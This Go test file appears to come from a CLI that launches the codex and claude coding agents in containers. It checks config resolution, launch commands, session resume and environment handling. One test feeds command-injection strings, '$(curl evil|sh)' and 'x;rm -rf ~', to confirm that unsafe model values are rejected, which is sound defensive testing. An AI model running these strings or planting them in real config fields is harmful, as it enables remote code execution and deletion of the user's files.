package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/coipond/coi/internal/config"
	"github.com/coipond/coi/internal/tool"
)

// configuredToolForProjectConfig writes a project .coi/config.toml with the
// given body, resolves it through the real config pipeline, and returns the
// tool exactly as a session launch configures it — an end-to-end check of the
// TOML → config resolution → getConfiguredTool wiring.
func configuredToolForProjectConfig(t *testing.T, tomlBody string) tool.Tool {
	t.Helper()
	dir := t.TempDir()
	coiDir := filepath.Join(dir, ".coi")
	if err := os.MkdirAll(coiDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(coiDir, "config.toml"), []byte(tomlBody), 0o644); err != nil {
		t.Fatal(err)
	}

	cfg := config.GetDefaultConfig()
	if err := cfg.OverlayProjectConfig(dir); err != nil {
		t.Fatalf("OverlayProjectConfig: %v", err)
	}

	tl, err := getConfiguredTool(cfg)
	if err != nil {
		t.Fatalf("getConfiguredTool: %v", err)
	}
	return tl
}

// TestGetConfiguredTool_Codex_AppliesKnobs drives the real chain for codex:
// [tool.codex] model/reasoning_effort and [tool] permission_mode must surface
// in the launch argv (codex has no settings-file injection — flags are the
// only delivery path, so this is the integration guard).
func TestGetConfiguredTool_Codex_AppliesKnobs(t *testing.T) {
	tl := configuredToolForProjectConfig(t,
		"[tool]\nname = \"codex\"\n\n[tool.codex]\nmodel = \"gpt-5-codex\"\nreasoning_effort = \"high\"\n")
	if tl.Name() != "codex" {
		t.Fatalf("tool = %q, want codex", tl.Name())
	}

	cmd := strings.Join(tl.BuildCommand("session-1", false, ""), " ")
	want := "codex --dangerously-bypass-approvals-and-sandbox -m gpt-5-codex -c model_reasoning_effort=high"
	if cmd != want {
		t.Errorf("launch command = %q, want %q", cmd, want)
	}
}

// TestGetConfiguredTool_Codex_InteractiveMode verifies permission_mode =
// "interactive" reaches codex as sandbox/approval flags instead of the bypass flag.
func TestGetConfiguredTool_Codex_InteractiveMode(t *testing.T) {
	tl := configuredToolForProjectConfig(t,
		"[tool]\nname = \"codex\"\npermission_mode = \"interactive\"\n")
	cmd := strings.Join(tl.BuildCommand("session-1", false, ""), " ")
	want := "codex -s workspace-write -a on-request"
	if cmd != want {
		t.Errorf("launch command = %q, want %q", cmd, want)
	}
}

// TestGetConfiguredTool_ClaudeConfigDoesNotLeakIntoCodex is the regression
// guard for the getConfiguredTool refactor: before it, [tool.claude] settings
// were fed to ANY tool implementing ToolWithModel/ToolWithEffortLevel, so a
// user with a Claude model configured would have had it passed to codex as -m.
func TestGetConfiguredTool_ClaudeConfigDoesNotLeakIntoCodex(t *testing.T) {
	tl := configuredToolForProjectConfig(t,
		"[tool]\nname = \"codex\"\n\n[tool.claude]\nmodel = \"claude-opus-4-8\"\neffort_level = \"max\"\n")
	cmd := strings.Join(tl.BuildCommand("session-1", false, ""), " ")
	if strings.Contains(cmd, "claude-opus-4-8") || strings.Contains(cmd, "max") {
		t.Errorf("[tool.claude] settings leaked into the codex launch command: %q", cmd)
	}
}

// TestGetConfiguredTool_CodexConfigDoesNotLeakIntoClaude is the mirror-image
// guard: [tool.codex] settings must not reach a claude session.
func TestGetConfiguredTool_CodexConfigDoesNotLeakIntoClaude(t *testing.T) {
	tl := configuredToolForProjectConfig(t,
		"[tool]\nname = \"claude\"\n\n[tool.codex]\nmodel = \"gpt-5-codex\"\n")
	env, _ := tl.GetSandboxSettings()["env"].(map[string]string)
	if env["ANTHROPIC_MODEL"] != "" {
		t.Errorf("[tool.codex] model leaked into Claude's ANTHROPIC_MODEL: %q", env["ANTHROPIC_MODEL"])
	}
}

// TestGetConfiguredTool_Codex_RejectsUnsafeFlagValues verifies the loud
// failure path: [tool.codex] values that are not shell-safe tokens (the argv
// is joined into a shell command string downstream, and the [tool] section is
// mergeable from untrusted project config) must error at launch, not launch a
// mangled or injected command.
func TestGetConfiguredTool_Codex_RejectsUnsafeFlagValues(t *testing.T) {
	for _, bad := range []string{"gpt 5-codex", "$(curl evil|sh)", "x;rm -rf ~"} {
		cfg := config.GetDefaultConfig()
		cfg.Tool.Name = "codex"
		cfg.Tool.Codex.Model = bad
		if _, err := getConfiguredTool(cfg); err == nil {
			t.Errorf("getConfiguredTool with model %q must error, got nil", bad)
		}

		cfg = config.GetDefaultConfig()
		cfg.Tool.Name = "codex"
		cfg.Tool.Codex.ReasoningEffort = bad
		if _, err := getConfiguredTool(cfg); err == nil {
			t.Errorf("getConfiguredTool with reasoning_effort %q must error, got nil", bad)
		}
	}
}

// TestBuildCLICommand_Codex_NewSession verifies the full command string for a
// fresh codex session in default (bypass) mode.
func TestBuildCLICommand_Codex_NewSession(t *testing.T) {
	c, err := tool.Get("codex")
	if err != nil {
		t.Fatal(err)
	}
	cmd := buildCLICommand("session-1", false, false, "/tmp/sessions", "", c)
	if cmd != "codex --dangerously-bypass-approvals-and-sandbox" {
		t.Errorf("buildCLICommand(new session) = %q", cmd)
	}
}

// TestBuildCLICommand_Codex_ResumeWithoutSavedState verifies resume falls back
// to `codex resume --last` when no saved session state yields a session UUID.
func TestBuildCLICommand_Codex_ResumeWithoutSavedState(t *testing.T) {
	c, err := tool.Get("codex")
	if err != nil {
		t.Fatal(err)
	}
	cmd := buildCLICommand("", true, false, t.TempDir(), "prev-session", c)
	if cmd != "codex resume --last --dangerously-bypass-approvals-and-sandbox" {
		t.Errorf("buildCLICommand(resume, no saved state) = %q", cmd)
	}
}

// TestBuildCLICommand_Codex_ResumeDiscoversRolloutUUID verifies the discovery
// chain end-to-end: a saved sessions-codex/<id>/.codex/sessions tree with a
// rollout file pins the resume to that session's UUID.
func TestBuildCLICommand_Codex_ResumeDiscoversRolloutUUID(t *testing.T) {
	c, err := tool.Get("codex")
	if err != nil {
		t.Fatal(err)
	}
	sessionsDir := t.TempDir()
	const uuid = "0199a213-81ee-7f21-8f5e-2f8a88e13d51"
	day := filepath.Join(sessionsDir, "prev-session", ".codex", "sessions", "2026", "08", "12")
	if err := os.MkdirAll(day, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(day, "rollout-2026-08-12T10-00-00-"+uuid+".jsonl"), []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	cmd := buildCLICommand("", true, false, sessionsDir, "prev-session", c)
	want := "codex resume " + uuid + " --dangerously-bypass-approvals-and-sandbox"
	if cmd != want {
		t.Errorf("buildCLICommand(resume with saved state) = %q, want %q", cmd, want)
	}
}

// TestBuildCLICommand_Codex_DummyMode verifies the CI/test stub override.
func TestBuildCLICommand_Codex_DummyMode(t *testing.T) {
	t.Setenv("COI_USE_DUMMY", "1")
	c, err := tool.Get("codex")
	if err != nil {
		t.Fatal(err)
	}
	cmd := buildCLICommand("session-1", false, false, "/tmp/sessions", "", c)
	if cmd != "dummy --dangerously-bypass-approvals-and-sandbox" {
		t.Errorf("buildCLICommand(dummy) = %q", cmd)
	}
}

// TestMergeToolEnv_Codex verifies codex adds no container env vars: its state
// (including sessions/) lives inside ~/.codex, which the standard config-dir
// save/restore persists — no XDG or session-dir redirects needed.
func TestMergeToolEnv_Codex(t *testing.T) {
	env := map[string]string{"HOME": "/home/code"}
	c, err := tool.Get("codex")
	if err != nil {
		t.Fatal(err)
	}
	mergeToolEnv(env, c, "/workspace")
	if len(env) != 1 || env["HOME"] != "/home/code" {
		t.Errorf("codex must not modify the container env, got %v", env)
	}
}
